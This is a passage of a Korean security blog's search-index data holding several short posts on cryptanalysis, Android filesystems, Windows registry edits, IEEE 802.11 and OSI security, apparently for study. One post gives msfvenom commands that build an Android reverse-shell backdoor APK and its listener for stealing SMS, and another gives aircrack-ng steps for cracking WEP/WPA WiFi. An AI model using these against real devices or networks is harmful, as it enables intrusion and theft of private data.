공격이다. 선택 평문 공격은 공격자가 선택한 평문-암호문의 짝을 이용해 복호화 키를 찾아내는 공격이다. 적응 선택 평문 공격(CPA2, Adaptive Chosen-Plaintext Attack) 선택 평문 공격이 공격자가 선택된 몇가지 평문들에 대한 암호문을 얻을 수 있다는 전제하에 하는 공격이라면 적응 선택 평문 공격은 공격자가 언제든지 자신이 선택한 평문에 대한 암호문을 얻을 수 있는 전제하에 하는 공격이다. 적응 선택 공격은 공격자가 지속적으로 원하는 평문에 대한 암호문을 얻어낼 수 있다는 전제하에 가능한 공격이다. 공격자가 평문-암호문의 짝을 이용해 복호화 키를 알아내는 공격이다. 선택 암호문 공격(CCA, Chosen-Ciphertext Attack) 공격자가 선택된 암호문들에 대한 평문을 얻을 수 있다는 전제하에 할 수 있는 공격이다. 선택 암호문 공격은 공격자가 선택한 암호문-평문의 짝을 이용해 복호화 키를 찾아내는 공격이다. 적응 선택 암호문 공격(CPA2, Adaptive Chosen-Ciphertext Attack) 선택 암호문 공격이 공격자가 선택된 몇가지 암호문들에 대한 평문을 얻을 수 있다는 전제하에 하는 공격이라면 적응 선택 암호문 공격은 공격자가 언제든지 자신이 선택한 암호문에 대한 평문을 얻을 수 있는 전제하에 하는 공격이다. 적응 선택 암호문 공격은 공격자가 지속적으로 원하는 암호문에 대한 평문을 얻어낼 수 있다는 전제하에 가능한 공격이다. 공격자가 암호문-평문의 짝을 이용해 복호화 키를 알아내는 공격이다. 참고 아래로 갈 수록 공격자에게 유리한 공격이다.\n선택 암호문 공격은 공격자가 현재 암호문을 복호화할 수 있는 상태라는 뜻이기 때문에 공격자에게 가장 유리한 상황이라고 할 수 있다.\n","permalink":"https://pol4bear.github.io/posts/attacks-on-cryptography/","summary":"공격자가 대상간 통신되는 정보를 알아내려고 스니핑을 시도하더라도 암호화된 통신이 이루어지고 있다면 공격자는 일반적인 방법으로는 통신의 내용을 알아낼 수 없다.\n스니핑을 통해 수집한 데이터의 내용을 알아내기 위해 해당 수집한 암호문에 여러가지 공격을 시도할 수 있다.\n공격 방법에는 대상간 통신을 도청, 변조 하는 중간자 공격(MITM, Man In The Middle Attack)과 암호 통신에서 사용하는 암호 알고리즘(DES, AES, RSA)을 공략해 암호 알고리즘을 공격하는 방법도 있다.\n공격의 종류 암호문 단독 공격(COA, Ciphertext-Only Attack) 암호화되서 전송되는 데이터인 암호문만을 가지고 평문과 암호키를 찾아내는 공격이다.","title":"암호문에 대한 공격"},{"content":"암호학은, 보안의 3대 요소중 기밀성(Confidentiality)을 충족하기 위한 보안 기술을 연구하는 학문이다.\nIT 서비스가 사용되면서 여러가지 데이터와 자동적으로 생성되는 메타데이터까지 여러 정보들이 생성되게 된다. 생성된 정보들은 네트워크를 통해 전송될 수 도 있고, 여러가지 장치 내부에 저장되어있을 수 도 있다.\n이러한 정보들 중 장치가 제 3자의 손에 넘어갔다고 하더라도 유출되어서는 안될 정보들도 있다. 이러한 정보들이 서비스되면서 전송 혹은 저장되면서 제 3자가 불법적인 방법으로 보더라도 그 내용을 쉽게 알지 못하게 하기 위해 암호학이 활발하기 연구되고 있고 심지어 이미 개발되어 사용되는 암호화 알고리즘들도 많이 있다.\n암호 알고리즘의 종류 대칭키(비밀키) 암호 암호화 알고리즘의 하나로 암호화할 때의 키와 복호화할 때의 키가 동일(대칭)한 암호 알고리즘을 말한다.\n수학적인 기술보다는 연산 비트 연산을 통해 구현된 알고리즘이 많기 때문에 공개키 암호화 알고리즘에 비해 속도가 빠른편이다.\n장점 비대칭키에 비해 알고리즘이 복잡하지 않다. 비대칭키에 비해 속도가 빠르다. 단점 비대칭키에 비해 키 공유가 어렵다. 키는 제 3자에게 노출되면 안되기 때문에 키를 공유할때 노출되지 않게 주의하여야 한다. 비대칭키에 비해 통신하는 사람의 수가 많아질수록 필요한 키의 갯수가 $N^2$으로 많다. 비대칭키(공개키) 암호 암호화 알고리즘의 하나로 암호화할 때의 키와 복호화할 때의 키가 동일하지 않은(비대칭)한 암호 알고리즘을 말한다.\n자신에게 보내는 데이터를 암호화할 수 있도록 공개하는 키 하나와 암호화되어 전송된 데이터를 복호화할 수 있고 공개되어선 안되는 키 하나로 이루어져 있다.\n장점\n대칭키에 비해 암호화 할 때 필요한 키인 공개키는 그냥 공개해버리면 되기 때문에 쉽다. 대칭키에 비해 통신하는 사람의 수가 늘어나도 필요한 키의 갯수가 $2N$으로 적다. 단점\n대칭키에 비해 알고리즘이 복잡하다. 수학적인 기술이 많이 들어간다. 대킹키에 비해 속도가 느리다. ","permalink":"https://pol4bear.github.io/posts/what-is-cryptography/","summary":"암호학은, 보안의 3대 요소중 기밀성(Confidentiality)을 충족하기 위한 보안 기술을 연구하는 학문이다.\nIT 서비스가 사용되면서 여러가지 데이터와 자동적으로 생성되는 메타데이터까지 여러 정보들이 생성되게 된다. 생성된 정보들은 네트워크를 통해 전송될 수 도 있고, 여러가지 장치 내부에 저장되어있을 수 도 있다.\n이러한 정보들 중 장치가 제 3자의 손에 넘어갔다고 하더라도 유출되어서는 안될 정보들도 있다. 이러한 정보들이 서비스되면서 전송 혹은 저장되면서 제 3자가 불법적인 방법으로 보더라도 그 내용을 쉽게 알지 못하게 하기 위해 암호학이 활발하기 연구되고 있고 심지어 이미 개발되어 사용되는 암호화 알고리즘들도 많이 있다.","title":"암호학이란?"},{"content":"안드로이드의 파일시스템은 리눅스 기반이라 그런지 리눅스의 파일시스템과 유사하다.\n파일 접근 권한도 리눅스 같이 작동하지만, 보안을 위해 root 권한은 비활성화되어 있다. 안드로이드의 중요 파일들은 root만 접근이 가능하게 해서 파일을 보호한다.\nroot 권한을 사용하기 위해선 iOS의 jailbreak같이 rooting이라는 것이 있다.\n루트 파일시스템(/): 안드로이드의 루트 영역. 루트 권한이 없으면 접근할 수 없다. Data 폴더(/data): 사용자 정보와 앱의 데이터들이 저장되는 경로 /data/app: 설치된 앱들의 패키지가 앱의 패키지명-1.apk 형식으로 저장되는 경로 /data/data: 앱이 구동될 때 필요한 이미지 등의 데이터가 저장되는 경로 /data/dalvic-cache: 설치된 앱들의 달빅 바이트 코드 파일(*.dex)들이 저장되는 경로 /data/misc: 저장된 Bluetooth 장치들, 저장된 Wi-Fi 정보 등이 저장되는 경로 System 폴더(/system): 안드로이드 시스템에 관련된 파일들이 저장되는 경로 /system/app: 블루투스 등의 시스템 앱들이 설치되는 경로 /system/lib: 시스템 앱에서 사용하는 라이브러리 파일이 저장되는 경로 /system/bin or /system/xbin: 안드로이드 폰을 루팅하면 생성되는 경로 내부 저장소(/storage/sdcard0): 기기의 내부 저장소 Android: /data/data에 저장되는 데이터 외에 앱이 구동될 때 추가적으로 다운로드한 데이터들이 저장되는 경로 Bluetooth: 블루투스를 통해 전송된 파일이 저장되는 경로 Download: 인터넷 브라우저로 다운로드한 파일들이 저장되는 경로 Pictures: 카메라 또는 스크린샷을 통해 찍은 사진들이 저장되는 경로 Ringtones: 벨소리들이 저장되는 경로 SD 카드(/storage/sdcard1): 기기의 외부 저장소. MicroSD 카드를 설치하여 추가 하는 메모리 ","permalink":"https://pol4bear.github.io/posts/android-file-system/","summary":"안드로이드의 파일시스템은 리눅스 기반이라 그런지 리눅스의 파일시스템과 유사하다.\n파일 접근 권한도 리눅스 같이 작동하지만, 보안을 위해 root 권한은 비활성화되어 있다. 안드로이드의 중요 파일들은 root만 접근이 가능하게 해서 파일을 보호한다.\nroot 권한을 사용하기 위해선 iOS의 jailbreak같이 rooting이라는 것이 있다.\n루트 파일시스템(/): 안드로이드의 루트 영역. 루트 권한이 없으면 접근할 수 없다. Data 폴더(/data): 사용자 정보와 앱의 데이터들이 저장되는 경로 /data/app: 설치된 앱들의 패키지가 앱의 패키지명-1.apk 형식으로 저장되는 경로 /data/data: 앱이 구동될 때 필요한 이미지 등의 데이터가 저장되는 경로 /data/dalvic-cache: 설치된 앱들의 달빅 바이트 코드 파일(*.","title":"안드로이드 파일시스템"},{"content":"마우스를 우클릭 하면 나오는 메뉴를 컨텍스트 메뉴(Context menu)라고 한다.\n윈도우에서 보여주는 이 컨텍스트 메뉴에 대한 정보는 윈도우 레지스트리에 등록되어 있다.\n윈도우 레지스트리를 변경해서 컨텍스트 메뉴에 원하는 아이템을 추가해보자.\n윈도우 레지스트리 편집기인 regedit을 실행한다.\n컨텍스트 메뉴 아이템이 들어있는 HKEY_LOCAL_MACHINE → SOFTWARE → CLASSES → * → SHELL 노드로 이동한다.\n편집 → 새로 만들기 → 키로 새로운 키를 생성한다.\n생성한 키의 이름을 컨텍스트 메뉴에 표시하고 싶은 이름으로 변경한다.\n생성한 키에 icon이라는 문자열 값을 만들고 데이터를 [실행 파일 경로], 0으로 설정한다.\n생성한 키의 안에 command라는 새로운 키를 생성하고 데이터를 [실행 파일 경로] \u0026ldquo;%1\u0026quot;로 설정한다.\n컨텍스트 메뉴의 아이템을 클릭하면 쉘 명령어가 실행되는 식인데 원하는 실행파일의 인자로 파일을 넘겨주어 실행되는 형식이다. 인자로 파일을 넘겨주지 않고 별도의 쉘 명령어를 사용하는 것도 가능하다. 쉘 스크립트로 자동화하기 아래와 같이 쉘 스크립트 코드를 작성한다.\n@echo off SET program_path=[프로그램 경로] REM ADD REGISTRY KEYS @reg add \u0026#34;HKEY_CLASSES_ROOT\\*\\shell\\[아이템 이름]\u0026#34; /t REG_SZ /v \u0026#34;\u0026#34; /d \u0026#34;\u0026#34; /f @reg add \u0026#34;HKEY_CLASSES_ROOT\\*\\shell\\[아이템 이름]\u0026#34; /t REG_EXPAND_SZ /v \u0026#34;Icon\u0026#34; /d \u0026#34;%program_path%,0\u0026#34; /f @reg add \u0026#34;HKEY_CLASSES_ROOT\\*\\shell\\[아이템 이름]\\command\u0026#34; /t REG_SZ /v \u0026#34;\u0026#34; /d \u0026#34;%program_path% \\\u0026#34;%%1\\\u0026#34;\u0026#34; /f pause bat 파일로 저장한 후 레지스트리 수정을 위해 관리자 권한으로 실행하면 컨텍스트 메뉴에 아이템이 추가된 것을 확인할 수 있다.\n","permalink":"https://pol4bear.github.io/posts/how-to-edit-windows-context-menu/","summary":"마우스를 우클릭 하면 나오는 메뉴를 컨텍스트 메뉴(Context menu)라고 한다.\n윈도우에서 보여주는 이 컨텍스트 메뉴에 대한 정보는 윈도우 레지스트리에 등록되어 있다.\n윈도우 레지스트리를 변경해서 컨텍스트 메뉴에 원하는 아이템을 추가해보자.\n윈도우 레지스트리 편집기인 regedit을 실행한다.\n컨텍스트 메뉴 아이템이 들어있는 HKEY_LOCAL_MACHINE → SOFTWARE → CLASSES → * → SHELL 노드로 이동한다.\n편집 → 새로 만들기 → 키로 새로운 키를 생성한다.\n생성한 키의 이름을 컨텍스트 메뉴에 표시하고 싶은 이름으로 변경한다.\n생성한 키에 icon이라는 문자열 값을 만들고 데이터를 [실행 파일 경로], 0으로 설정한다.","title":"윈도우 우클릭 메뉴에 아이템 추가하기"},{"content":"MSFvenom이란? 안드로이드에 백도어를 만들어서 연락처와 최근 통화목록 추출, 카메라 제어 등을 할 수 있는 침투 테스트 앱이다.\nMSFvenom 앱 생성하기 msfvenom -p android/meterpreter/reverse_tcp LHOST=[Kali linux IP] LPORT=[개방할 포트] R \u0026gt; [생성할 앱 이름].apk 포트를 개방하고 MSFvenom의 실행을 기다리기 # msfconsole msf \u0026gt; use multi/handler # msf exploit(handler) \u0026gt; set payload android/meterpreter/reverse_tcp # msf exploit(handler) \u0026gt; set LHOST [Kali linux IP] # msf exploit(handler) \u0026gt; set LPORT [개방할 포트] # msf explot(handler) \u0026gt; exploit MSFvenom 앱 제어 루트 권한 여부 확인하기\n현재 작동하는 프로세스 목록 확인하기\n파일 구조 확인하기\n네트워크 인터페이스 확인하기\n메시지 가져오기\nsms_dump_20161005091223.txt:\n참고 2016년 10월 기준 안드로이드 6.0버전 이하에서 작동 가능했다. 설명된 기능 외에도 help 명령어로 다양한 기능들을 찾아서 사용할 수 있다. ","permalink":"https://pol4bear.github.io/posts/android-hacking-using-msfvenom/","summary":"MSFvenom이란? 안드로이드에 백도어를 만들어서 연락처와 최근 통화목록 추출, 카메라 제어 등을 할 수 있는 침투 테스트 앱이다.\nMSFvenom 앱 생성하기 msfvenom -p android/meterpreter/reverse_tcp LHOST=[Kali linux IP] LPORT=[개방할 포트] R \u0026gt; [생성할 앱 이름].apk 포트를 개방하고 MSFvenom의 실행을 기다리기 # msfconsole msf \u0026gt; use multi/handler # msf exploit(handler) \u0026gt; set payload android/meterpreter/reverse_tcp # msf exploit(handler) \u0026gt; set LHOST [Kali linux IP] # msf exploit(handler) \u0026gt; set LPORT [개방할 포트] # msf explot(handler) \u0026gt; exploit MSFvenom 앱 제어 루트 권한 여부 확인하기","title":"MSFvenom으로 안드로이드 해킹하기\""},{"content":" IEEE 802.11은 현재 주로 쓰이는 유선 LAN 의 단점을 보완한 네트워킹을 위해 1997년 전기 전자 기술자 협회(IEEE)의 LAN/MAN 표준 위원회 802의 11번째 워킹그룹에서 개발해서 발표한 최초의 무선랜 표준 기술이다. IEEE 802.11은 2.4Ghz 대역대의 전파를 통해 최대 2Mbps의 속도로 통신할 수 있다. IEEE 802.11은 규격이 엄격하게 정해지지 않아서 각각 다른 회사에서 개발된 제품들간의 호환성이 부족하고, 속도도 느리기 때문에 널리 사용되지는 않았다. IEEE 802.11 프로토콜의 구조 FRAME CONTROL: Frame 관련 제어 정보\nDURATION: NAV의 값을 설정했을 때 사용되는 전송 기간\nAddress: 각각 6Byte의 4개의 주소\nWDS(무선 브리지)를 경유하여 전송되는 경우 4개의 주소 사용 제어 프레임 중 ACK 프레임의 경우 1개의 주소 사용 나머지 대부분의 경우 3개의 주소 사용 SEQUENCE CONTROL: 프레임을 조각하여 전송할때 흐름제어를 위해 사용되는 순서 번호\nDATA: 0에서 2312바이트 길이로 구성된 데이터\nFCS: CRC-32 오류 검출 시퀀스\n","permalink":"https://pol4bear.github.io/posts/wireless-standard-ieee-802-11/","summary":"IEEE 802.11은 현재 주로 쓰이는 유선 LAN 의 단점을 보완한 네트워킹을 위해 1997년 전기 전자 기술자 협회(IEEE)의 LAN/MAN 표준 위원회 802의 11번째 워킹그룹에서 개발해서 발표한 최초의 무선랜 표준 기술이다. IEEE 802.11은 2.4Ghz 대역대의 전파를 통해 최대 2Mbps의 속도로 통신할 수 있다. IEEE 802.11은 규격이 엄격하게 정해지지 않아서 각각 다른 회사에서 개발된 제품들간의 호환성이 부족하고, 속도도 느리기 때문에 널리 사용되지는 않았다. IEEE 802.11 프로토콜의 구조 FRAME CONTROL: Frame 관련 제어 정보","title":"무선랜 표준 IEEE 802.11"},{"content":"WEP를 사용하는 WiFi 요즘 세상에 WEP를 사용하는 WiFi를 찾기는 쉽지 않다. 하지만, 이미 취약점이 알려진 WEP를 사용하는 WiFi를 찾는다면 Aircrack-ng 를 사용해서 손쉽게 크랙할 수 있다.\nAircrack-ng는 Windows, Linux, macOS, Unix 등 많은 운영체제를 지원한다.\n칼리 리눅스에는 기본적으로 설치되어 있고, 우분투에서도 패키지 관리자로 쉽게 설치가 가능하다.\n현재 사용 가능한 무선랜 인터페이스 확인하기\niwconfig 랜 어댑터를 airmon-ng를 통해 Promiscuous mode(무차별 모드)로 변경하기.\n2번의 명령어를 실행하면 [무선랜 인터페이스]가 무차별 모드로 변경되고 뒤에 mon이 붙어 별개의 인터페이스가 생성된다.\nairmon-ng start wlan0을 실행하면 wlan0mon 인터페이스가 생성된다.\nifconfig [무선랜 인터페이스] down airmon-ng start [무선랜 인터페이스] 주변에 있는 와이파이들의 데이터 수집하기\n이 명령어를 실행하면 주변에 있는 와이파이들의 데이터를 수집하고 수집된 와이파이들의 정보를 보여준다. airodump-ng [무선랜 인터페이스] 3번에서 해킹할 와이파이를 특정해서 해킹할 와이파이의 데이터만 수집하기\nWEP는 이미 취약점이 발견된 보안 방식이기 때문에 와이파이를 사용하면서 발생되는 데이터들을 충분히 수집한다면 해당 와이파이의 비밀번호를 알아낼 수 있다.\nAircrack-ng의 참고 자료에는 10,000개 이상의 데이터가 수집되어야 원할하게 해킹이 가능하다고 나와있다.\nairodump-ng -w [데이터를 수집 할 파일] -c [채널] --bssid [bssid] [무선랜 인터페이스] 임의로 fake authentication 패킷을 발생시켜 가짜 인증을 시도한다.\naireplay-ng -1 0 -a [bssid] [무선랜 어댑터] 데이터를 원할하게 수집하기 위해 ARP request 데이터를 임의적으로 발생시킨다.\naireplay-ng -3 -b [bssid] [무선랜 인터페이스] 새로운 터미널 창을 열어 수집한 데이터를 이용해 와이파이를 해킹한다.\n크랙에 실패하면 5,000개의 데이터가 추가로 수집되기까지 기다린 후 다시 시도한다. aircrack-ng -b [bssid] [데이터 수집 파일] WPA/WPA2를 사용하는 와이파이 해킹할 와이파이를 특정한 후 해당 와이파이의 데이터를 수집하는 것 까지는 WEP 와이파이 해킹하기와 동일하다.\nWPA/WPA2로 보안된 와이파이를 해킹하기 위해선 해당 와이파이에 제 3자가 정상적으로 연결에 성공할 때 발생되는 인증 데이터가 필요하다. 제 3자가 와이파이에 연결하길 기다리는 방법도 있지만 빠른 진행을 위해 연결해제(deauthenticate) 데이터를 발생시켜서 제 3자가 와이파이에 다시 접속하도록 만든다.\naireplay-ng -0 100 -a [bssid] [무선랜 인터페이스] 제 3자가 와이파이에 연결할 때 발생된 데이터를 수집한 뒤 해당 데이터에 사전공격을 통해 와이파이를 해킹한다.\n사전공격을 위해선 비밀번호들이 저장된 워드리스트가 필요하다. 워드리스트에 와이파이의 비밀번호가 있다면 해킹이 성공할 수 있지만 워드리스트에 와이파이의 비밀번호가 없다면 해킹이 불가능하다. aircrack-ng -b [bssid] -w [워드리스트 파일] [데이터 수집 파일] 참고 2019년 기준 WPA2도 취약점이 발견되서 안전하지 않다고 한다. WPA3가 나온 상태지만 아직까지 WPA3를 사용하는 AP는 보지 못했다. ","permalink":"https://pol4bear.github.io/posts/how-to-crack-wifi-using-aircrack-ng/","summary":"WEP를 사용하는 WiFi 요즘 세상에 WEP를 사용하는 WiFi를 찾기는 쉽지 않다. 하지만, 이미 취약점이 알려진 WEP를 사용하는 WiFi를 찾는다면 Aircrack-ng 를 사용해서 손쉽게 크랙할 수 있다.\nAircrack-ng는 Windows, Linux, macOS, Unix 등 많은 운영체제를 지원한다.\n칼리 리눅스에는 기본적으로 설치되어 있고, 우분투에서도 패키지 관리자로 쉽게 설치가 가능하다.\n현재 사용 가능한 무선랜 인터페이스 확인하기\niwconfig 랜 어댑터를 airmon-ng를 통해 Promiscuous mode(무차별 모드)로 변경하기.\n2번의 명령어를 실행하면 [무선랜 인터페이스]가 무차별 모드로 변경되고 뒤에 mon이 붙어 별개의 인터페이스가 생성된다.","title":"WiFi 비밀번호 크랙하기"},{"content":" ITU(국제전기통신연합)에서 통신 분야의 표준을 책정하는 ITU-T의 권고안인 X.800, OSI 보안 구조는 관리자가 효과적으로 보안 문제를 조직화 할 수 있는 방법을 제공한다.\nOSI 보안 구조는 국제적으로 표준화되어 있기 때문에 컴퓨터나 통신장비 생산자는 제품과 서비스에 권고된 보안규정을 적용하여 발전시켜야 한다.\nOSI 보안 구조의 핵심은 보안 공격, 보안 매커니즘, 보안 서비스가 있다.\n보안 공격(Security Attack) 정보의 안전성을 침해하는 행위\n시스템에 미치는 영향에 따른 공격 OSI 보안 구조(X.800)와 RFC 2828에 의하면 보안 공격은 크게 소극적 공격(Passive Attack)과 적극적 공격(Active Attack)으로 나눌 수 있다. 소극적 공격 : 스니핑(Sniffing)과 같이 시스템에 직접적으로 정보 시스템에 영향을 미치지 않는 공격 행위를 말한다. 적극적 공격 : 소극적 공격과 스푸핑(Spoofing) 달리 직접적으로 정보 시스템에 영향을 미치는 공격을 말한다. 보안의 목표에 따른 공격 기밀성을 위협하는 공격 스니핑(Sniffing) : 스니핑은 공격자 불법적으로 데이터에 접근 또는 탈취하는 것을 말한다. 트래픽 분석(Traffic Analysis) : 트래픽을 통해서 공격자가 송, 수신자의 주소(IP, MAC)와 성향 등을 분석하는 것을 말한다. 암호화 등의 데이터 보호 기법으로 데이터의 내용을 알 수 없더라도 누구와 언제 통신하는지 등의 정보를 수집할 수 있기 때문에 트래픽 분석이라고 할 수 있다. 무결성을 위협하는 공격 변경(Modification) : 접근이 허락되지 않은 제 3자가 송·수신되는 데이터를 중간에 무단으로 수정, 지연, 순서 바꾸는 등 정보에 대한 공격 행위다. 가장(Masquerading) : 제 3자가 자신이 정당한 사용자인 척 행세를 하는 것이다. 가장 공격은 대체적으로 시스템에 영향을 주는 다른 공격들과 함께 같이 사용된다. 재연(Replying) : 제 3자가 송·수신되는 데이터를 보관하고 있다가 일정 시간이 지난 후에 그대로 혹은 수정하여 다시 전송하여 정보에 대해 접근을 시도하는 공격 행위다. 부인(Repudiation) : 송신자가 자신이 보낸 데이터를 보내지 않았다고 부인하거나 수신자가 자신이 받은 데이터를 받지 않았다고 부인하는 행위다. 가용성을 위협하는 공격 서비스 거부(Denial of Service) : 제 3자가 시스템에게 지나치게 많은 접근을 시도하여 정보 시스템의 접근 처리를 방해하고 심하게는 시스템을 다운시키기까지 하는 공격 행위다. 보안 메커니즘(Security mechanism) 보안 공격을 탐지, 예방하거나 공격으로 인한 침해를 복구하는 절차\n특정 보안 메커니즘: 정보 시스템에 접근하는 개체에 대해 인증하는 보안 메커니즘 일반 보안 메커니즘: 특정 보안 서비스나 프로토콜 계층과의 관계와 상관 없는 별도의 보안 메커니즘 보안 서비스(Security Service) 정보 처리 시스템의 보안을 강화하기 위한 서비스\n보안 공격에 대비하기 위한 것이며 하나 또는 그 이상의 보안 메커니즘을 사용하여 제공\n기밀성 서비스(Confidentiality Service) : 기밀성 서비스는 소극적 공격으로부터 데이터를 보호하는 서비스다. 데이터 전송의 내용을 중심으로 보면 보호의 레벨이 여러 단계로 나뉘지만 가장 보편적인 기밀성 보안 서비스는 두 사용자 사이에 전송되는 모든 데이터를 보안하는 것이다. 무결성 서비스(Integrity Service) : 적극적 공격 중에서도 무결성을 위협하는 공격으로부터 데이터를 보호하는 서비스다. 데이터의 특정 부분에만 적용할 수 있으나 가장 단순한 방법은 데이터 전체를 보안하는 것이다. 가용성 서비스(Availability Service) : 정보 자원에 접근할 필요가 있거나 접근하고자 할 때 정보 자원에 접근할 수 있도록 하는 서비스다. 인증 서비스(Authentication Service) : 인증 서비스는 통신 대상에 대한 인증을 제공하는 서비스다. 연결지향 통신에서는 연결 대상에 대한 인증(Peer entity authentication)을 제공하고, 비연결지향 통신에서는 데이터의 출처에 대한 인증(Data origin authentication)을 제공한다. 부인방지 서비스(Nonrepudiation Service) : 송신자·수신자가 데이터를 전송했거나 수신 했다는 사실을 부정하지 못하도록 막는 서비스다. 접근제어 서비스(Access Control Service) : 정보 시스템에 대한 시스템·사용자의 접근을 제한하고 통제할 수 있는 서비스다. 접근제어를 위해서 접근을 시도하는 개체에 대한 인증이 필요하다. 인증된 개체에 따라 접근 권한을 다르게 부여한다. ","permalink":"https://pol4bear.github.io/posts/what-is-osi-security-architecture/","summary":"ITU(국제전기통신연합)에서 통신 분야의 표준을 책정하는 ITU-T의 권고안인 X.800, OSI 보안 구조는 관리자가 효과적으로 보안 문제를 조직화 할 수 있는 방법을 제공한다.\nOSI 보안 구조는 국제적으로 표준화되어 있기 때문에 컴퓨터나 통신장비 생산자는 제품과 서비스에 권고된 보안규정을 적용하여 발전시켜야 한다.\nOSI 보안 구조의 핵심은 보안 공격, 보안 매커니즘, 보안 서비스가 있다.\n보안 공격(Security Attack) 정보의 안전성을 침해하는 행위\n시스템에 미치는 영향에 따른 공격 OSI 보안 구조(X.800)와 RFC 2828에 의하면 보안 공격은 크게 소극적 공격(Passive Attack)과 적극적 공격(Active Attack)으로 나눌 수 있다.","title":"OSI 보안 구조란?"}]